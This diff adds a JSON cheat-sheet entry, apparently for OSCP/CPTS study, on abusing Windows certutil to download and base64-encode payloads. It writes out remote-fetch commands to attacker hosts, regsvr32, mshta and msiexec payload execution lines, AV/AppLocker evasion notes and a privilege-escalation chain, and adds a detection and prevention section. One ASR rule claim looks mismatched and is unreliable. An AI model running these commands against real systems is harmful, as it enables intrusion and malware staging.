@@ -1,0 +1,85 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "certutil"
+  ],
+  "tags": [
+    "lolbas",
+    "file-transfer",
+    "certutil"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Miscellaneous Techniques",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Download a file to the target",
+      "command": "certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat"
+    },
+    {
+      "label": "Base64-encode a file",
+      "command": "certutil -encode file1 encodedfile"
+    },
+    {
+      "label": "Base64-decode a file",
+      "command": "certutil -decode encodedfile file2"
+    }
+  ],
+  "notes": "=== CertUtil — LOLBAS File Transfer and Encoding ===\nCertutil.exe is a signed Microsoft binary that doubles as HTTP downloader and base64 encoder/decoder.\n\n=== LOLBAS BACKGROUND ===\nLOLBAS = Living Off The Land Binaries, Scripts, and Libraries\nMicrosoft-signed files native to Windows abused for unintended purposes\nTrusted by application whitelisting solutions — effective for AV/AppLocker evasion\n\n=== CERTUTIL CAPABILITIES ===\nHTTP file download (main use for file transfer):\n  certutil -urlcache -split -f http://ATTACKER_IP/shell.exe C:\\Temp\\shell.exe\n  certutil -urlcache -split -f http://ATTACKER_IP/tool.exe tool.exe\n\nBase64 encoding (convert binary to text for text-only channels):\n  certutil -encode C:\\Tools\\malware.exe C:\\Temp\\malware.b64\n  → Creates base64 file that can be transferred as text\n\nBase64 decoding (restore binary from encoded text):\n  certutil -decode C:\\Temp\\malware.b64 C:\\Tools\\malware.exe\n  → Reconstructs original binary\n\n=== OTHER LOLBAS EXAMPLES ===\nrundll32.exe → execute DLL files directly (avoids spawning cmd.exe):\n  rundll32.exe C:\\malicious.dll,EntryPoint\n\nregsvr32.exe → execute COM scriptlets (AppLocker bypass):\n  regsvr32 /u /n /s /i:http://ATTACKER/payload.sct scrobj.dll\n\nmshta.exe → execute HTA files (HTML Application):\n  mshta http://ATTACKER/payload.hta\n\nmsiexec.exe → execute MSI packages from URL:\n  msiexec /quiet /i http://ATTACKER/malicious.msi\n\n=== DETECTION AND EVASION ===\ncertutil.exe creating network connections = often flagged by EDR\ncertutil DNS lookups logged in network monitoring\nAlternative: PowerShell DownloadFile or DownloadString often less flagged\nBitsAdmin also works: bitsadmin /transfer job /download http://ATTACKER/file.exe C:\\Temp\\file.exe\n\n=== CHAINING CONTEXT ===\ncertutil download → transfer JuicyPotato/SharpUp/tools to target → exploitation\ncertutil base64 → transfer binary tools through text-only channels (web shells with limited output)\nxp_cmdshell → certutil download → JuicyPotato → SYSTEM (classic MSSQL chain)\nWeb shell → certutil download → tool staging → privilege escalation chain\n\n=== LOLBAS PROJECT ===\nhttps://lolbas-project.github.io — complete catalog with abuse techniques for each binary",
+  "references": [
+    {
+      "title": "LOLBAS - Certutil",
+      "url": "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "dnsadmins-dll",
+      "note": "Use it to deliver a payload DLL/binary.",
+      "rel": "next"
+    }
+  ],
+  "id": "certutil-transfer",
+  "name": "Misc - certutil File Transfer & Encoding",
+  "command": "certutil.exe -urlcache -split -f http://<lhost>:8080/shell.bat shell.bat",
+  "description": "certutil is a LOLBAS: download files over HTTP and base64 encode/decode them to move payloads past filters.",
+  "opsec": "loud",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "certutil.exe is a built-in Windows binary (LOLBAS) for certificate operations that can also download files from URLs (-urlcache -split -f) and encode/decode Base64 (-encode/-decode). It is trusted by default, often allowed through application whitelisting, and its network activity may be overlooked compared to PowerShell web downloads.",
+    "prerequisites": "Shell access. certutil.exe available (default on all Windows). Network access to attacker-hosted HTTP server. Target URL reachable.",
+    "impact": "File transfer of attack tools or payloads to the target system, bypassing naive download controls. Enables staging of additional exploit tools, persistence mechanisms, or exfiltration helpers.",
+    "detection": "certutil.exe making outbound HTTP connections (unusual for a certificate utility). certutil execution with -urlcache flag. Network logs: HTTP request from certutil.exe User-Agent. SIEM: certutil network activity alert.",
+    "artifacts": "Process log: certutil.exe -urlcache -split -f http://... | Network: HTTP request from certutil to external IP | File: downloaded tool in %TEMP% or staging directory",
+    "prevention": "Block outbound HTTP from non-browser processes on servers via NGFW with application-aware rules. Windows Defender Attack Surface Reduction (ASR) rule: block abuse of exploited vulnerable signed drivers covers certutil. Monitor certutil.exe for network activity. Consider application whitelisting with network restriction rules.",
+    "misconfiguration": "No outbound HTTP filtering from servers. Application whitelisting allows certutil but no network behavior monitoring. No SIEM alert on certutil network activity.",
+    "vulnerable_config": "# File download via certutil:\ncertutil.exe -urlcache -split -f http://10.10.14.3:8080/winPEAS.exe winPEAS.exe\n\n# Base64 encode/decode to bypass string detection:\ncertutil -encode input.exe encoded.b64\ncertutil -decode encoded.b64 output.exe",
+    "secure_config": "# Block certutil outbound HTTP (NGFW/proxy):\n# Application control: block certutil.exe from making network connections\n\n# Enable ASR rule:\nAdd-MpPreference -AttackSurfaceReductionRules_Ids 01443614-cd74-433a-b99e-2ecdc07bfc25 -AttackSurfaceReductionRules_Actions Enabled\n\n# Monitor certutil in SIEM:\n# Alert: certutil.exe process with network connection established",
+    "sources": [
+      "HTB M26",
+      "MITRE T1105",
+      "MITRE T1140"
+    ]
+  }
+}
